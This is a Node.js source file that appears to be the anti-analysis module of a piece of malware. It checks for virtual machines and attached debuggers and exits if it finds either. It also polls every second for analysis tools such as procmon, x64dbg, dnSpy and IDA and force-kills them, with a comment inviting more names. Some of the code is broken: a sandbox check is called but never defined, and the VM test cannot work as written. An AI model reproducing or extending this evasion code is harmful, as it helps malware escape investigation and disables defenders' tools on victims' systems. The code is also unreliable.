const { exec } = require('child_process');
const os = require('os');
const ffi = require('ffi');

const kernel32 = ffi.Library('kernel32.dll', {
  'GetModuleHandleA': ['int32', ['string']],
  'CheckRemoteDebuggerPresent': ['bool', ['int32', 'bool']],
  'IsDebuggerPresent': ['bool', []],
  'GetCurrentProcess': ['int32', []],
});

const ProcNames = ['ProcessHacker', 'procmon', 'x32dbg', 'x64dbg', 'dnspy', 'ida64', 'ida']; // add to this, these are examples
const isVM = () => {
  const manufacturer = os.platform().toLowerCase();

  if (
    (manufacturer.includes('win32') && os.release().toUpperCase().includes('VIRTUAL')) ||
    manufacturer.includes('vmware') ||
    os.hostname() === 'VirtualBox'
  ) {
    return true;
  }

  return false;
};

const isDebuggerAttached = () => {
  const processHandle = kernel32.GetModuleHandleA(null);
  if (kernel32.IsDebuggerPresent() || kernel32.CheckRemoteDebuggerPresent(processHandle, kernel32.GetCurrentProcess())) {
    return true;
  }
  return false;
};

const Detect = () => {
  for (const processName of ProcNames) {
    exec(`tasklist /FI "IMAGENAME eq ${processName}.exe"`, (error, stdout) => {
      if (!error) {
        const processList = stdout.toLowerCase();
        if (processList.includes(processName.toLowerCase())) {
          exec(`taskkill /F /IM ${processName}.exe`, (error) => {
            if (!error) {
              console.log(`Killed process: ${processName}`);
            }
          });
        }
      }
    });
  }
};

const runAntiAnalysis = () => {
  if (isVM() || isDebuggerAttached() || isSandboxie()) {
    process.exit(1);
  }

  setInterval(Detect, 1000); // Check every second
};

runAntiAnalysis();
